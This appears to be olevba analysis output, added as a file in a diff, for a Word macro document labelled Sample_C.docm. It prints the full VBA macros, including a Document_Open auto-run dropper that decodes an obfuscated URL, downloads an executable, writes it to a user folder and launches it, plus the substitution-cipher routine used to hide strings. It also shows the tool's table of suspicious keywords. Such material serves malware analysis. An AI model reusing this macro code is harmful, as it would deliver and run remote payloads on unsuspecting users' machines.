@@ -1,0 +1,196 @@
+olevba 0.60.1 on Python 3.11.3 - http://decalage.info/python/oletools
+===============================================================================
+FILE: Sample_C.docm
+Type: OpenXML
+WARNING  For now, VBA stomping cannot be detected for files in memory
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Function awuiut() As Byte
+awuiut = 0
+Call wiztuo
+End Function
+
+Private Sub Document_Open2()
+Dim QYgjfSpecialPathOIhb As String
+Dim WshShell As Object
+Dim item0 As Integer
+item0 = Chr(50) + Chr(48) + Chr(48)
+  
+    
+
+    Set WshShell = CreateObject("WScript.Shell")
+    QYgjfSpecialPathOIhb = WshShell.SpecialFolders("Printhood")
+Dim item1
+Dim item2
+Dim item3
+Dim item4
+Dim item5
+Dim item6 As Integer
+Dim item7
+Dim item8
+item6 = 1
+
+
+
+Set item7 = CreateObject("microsoft.xmlhttp")
+Set item5 = CreateObject("Shell.Application")
+
+item4 = QYgjfSpecialPathOIhb + item9("\¥ØZJW.ÂÛÂ")
+item7.Open "get", item9("hÖÖÓ://bÀgÕÔÀd.ÁÒm:8099/vÒÔÔÜ/ÕÂÔvÂÔ1.ÂÛÂ"), False
+item7.send
+item2 = item7.responseBody
+If item7.Status = 200 Then
+Set item1 = CreateObject("adodb.stream")
+item1.Open
+item1.Type = item6
+item1.Write item2
+item1.SaveToFile item4, item6 + item6
+item1.Close
+End If
+item5.Open (item4)
+End Sub
+Function wiztuo() As Currency
+wiztuo = 1000000000
+Call Bitiob
+End Function
+Function Bitiob() As Double
+Call RUitiobb
+End Function
+Function RUitiobb() As Integer
+RUitiobb = 41
+Call Hiotbdek
+End Function
+Function Hiotbdek() As Long
+Hiotbdek = Hiotbdek
+Call Jiotbdek
+End Function
+
+
+    Public Function item10(item11)
+        item12 = " ?!@#$%^&*()_+|0123456789abcdefghijklmnopqrstuvwxyz.,-~ABCDEFGHIJKLMNOPQRSTUVWXYZ¿¡²³ÀÁÂÃÄÅÒÓÔÕÖÙÛÜàáâãäåØ¶§Ú¥"
+        item13 = " ¿¡@#$%^&*()_+|01²³456789ÀbÁdÂÃghÄjklmÅÒÓqÔÕÖÙvwÛÜz.,-~AàáâãFGHäJKåMNØ¶QR§TÚVWX¥Z?!23acefinoprstuxyBCDEILOPSUY"
+        For R = 1 To Len(item11)
+            item14 = InStr(item12, Mid(item11, R, 1))
+            If item14 > 0 Then
+                item15 = Mid(item13, item14, 1)
+                item16 = item16 + item15
+            Else
+                item16 = item16 + Mid(item11, R, 1)
+            End If
+        Next
+        item10 = item16
+        MsgBox item10
+    End Function
+    
+    
+Function Jiotbdek() As Single
+Jiotbdek = Jiotbdek
+Call finiotbdek
+End Function
+Function finiotbdek() As Date
+
+End Function
+
+   Public Function item9(item17)
+        item18 = " ?!@#$%^&*()_+|0123456789abcdefghijklmnopqrstuvwxyz.,-~ABCDEFGHIJKLMNOPQRSTUVWXYZ¿¡²³ÀÁÂÃÄÅÒÓÔÕÖÙÛÜàáâãäåØ¶§Ú¥"
+        item19 = " ¿¡@#$%^&*()_+|01²³456789ÀbÁdÂÃghÄjklmÅÒÓqÔÕÖÙvwÛÜz.,-~AàáâãFGHäJKåMNØ¶QR§TÚVWX¥Z?!23acefinoprstuxyBCDEILOPSUY"
+        For D = 1 To Len(item17)
+            item20 = InStr(item18, Mid(item17, D, 1))
+            If item20 > 0 Then
+                item21 = Mid(item19, item20, 1)
+                item22 = item22 + item21
+            Else
+                item22 = item22 + Mid(item17, D, 1)
+            End If
+        Next
+        item9 = item22
+    End Function
+
+
+
+Function Dionbt() As Currency
+Call tiuoty
+End Function
+Function tiuoty() As Boolean
+tiuoty = False
+Call awuiut
+End Function
+
+Private Sub Document_Open()
+Dim UtfvSpecialPathKHVjh As String
+Dim WshShell As Object
+Dim item23 As Integer
+item23 = Chr(50) + Chr(48) + Chr(48)
+  
+    
+
+    Set WshShell = CreateObject("WScript.Shell")
+    UtfvSpecialPathKHVjh = WshShell.SpecialFolders("Recent")
+Dim item24
+Dim item25
+Dim item26
+Dim item27
+Dim item28
+Dim item29 As Integer
+Dim item30
+Dim item31
+item29 = 1
+
+
+MsgBox "Advertencia: Macro cargada....(Recargar documento)"
+
+Set item30 = CreateObject("microsoft.xmlhttp")
+Set item28 = CreateObject("Shell.Application")
+
+item27 = UtfvSpecialPathKHVjh + item10("\Hä§HJQV.ÂÛÂ")
+item30.Open "get", item10("hÖÖÓ://bÀgÕÔÀd.ÁÒm:8099/ÜÒÔÔÜ/ÕÂÔvÂÔ1.ÂÛÂ"), False
+item30.send
+item25 = item30.responseBody
+If item30.Status = 200 Then
+Set item24 = CreateObject("adodb.stream")
+item24.Open
+item24.Type = item29
+item24.Write item25
+item24.SaveToFile item27, item29 + item29
+item24.Close
+End If
+item28.Open (item27)
+End Sub
+
+-------------------------------------------------------------------------------
+VBA MACRO NewMacros.bas 
+in file: word/vbaProject.bin - OLE stream: 'VBA/NewMacros'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Sub doc()
+'
+' doc Macro
+'
+'
+End Sub
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
+|          |                    |opened                                       |
+|Suspicious|Open                |May open a file                              |
+|Suspicious|Write               |May write to a file (if combined with Open)  |
+|Suspicious|adodb.stream        |May create a text file                       |
+|Suspicious|SaveToFile          |May create a text file                       |
+|Suspicious|Shell               |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|WScript.Shell       |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
+|Suspicious|CreateObject        |May create an OLE object                     |
+|Suspicious|Shell.Application   |May run an application (if combined with     |
+|          |                    |CreateObject)                                |
+|Suspicious|microsoft.xmlhttp   |May download files from the Internet         |
+|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
+|          |                    |(use option --deobf to deobfuscate)          |
+|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
++----------+--------------------+---------------------------------------------+
+
